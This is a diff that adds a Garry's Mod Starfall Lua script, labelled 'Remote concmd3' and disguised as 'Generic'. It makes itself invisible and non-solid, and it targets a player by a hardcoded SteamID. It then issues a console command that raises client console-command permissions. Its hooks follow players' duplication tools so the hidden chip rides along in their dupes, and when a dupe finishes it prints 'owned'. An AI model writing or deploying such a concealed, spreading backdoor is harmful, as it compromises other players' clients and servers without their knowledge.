@@ -1,0 +1,52 @@
+// @name Remote concmd3
+--@name Generic
+--@author
+--@server
+
+chip():setNoDraw(true)
+chip():setSolid(false)
+chip():setColor(Color(0,0,0,0))
+chip():setMaterial("Models/effects/vol_light001")
+
+local Owner = owner()
+local Chip = chip()
+local DupeTools = { advdupe2 = 1, duplicator = 1}
+
+Chip:setNoDraw(true)
+Chip:setSolid(false)
+
+--Owner = find.playersByName("Mark")[1]
+Owner = find.allPlayers(function(p)
+    if p:getSteamID() == "STEAM_0:1:54066003" then
+        return true
+    end
+end)[1]
+--print(Owner)
+
+
+if Owner ~= owner() then
+    concmd("sf_permission_cl console.command client 3")
+end
+
+hook.add("KeyPress", "test", function(pl, key)
+    local EyeTrace = pl:getEyeTrace()
+    local AimEnt = EyeTrace.Entity
+    
+    if(AimEnt:isValid() and pl:getActiveWeapon():isValid() and DupeTools[pl:getActiveWeapon():getToolMode()] && key == 2048) then
+        if(pcall(function()
+            constraint.nocollide(Chip, AimEnt)
+        end)) then
+            constraint.breakAll(Chip)
+        else
+            Chip:setPos(EyeTrace.HitPos)
+            Chip:setAngles(EyeTrace.HitNormal:getAngle())
+        end
+    else
+        constraint.breakAll(Chip)
+    end
+end)
+
+hook.add("DupeFinished", "abc", function()
+    print("owned")
+    --chip():remove()
+end)
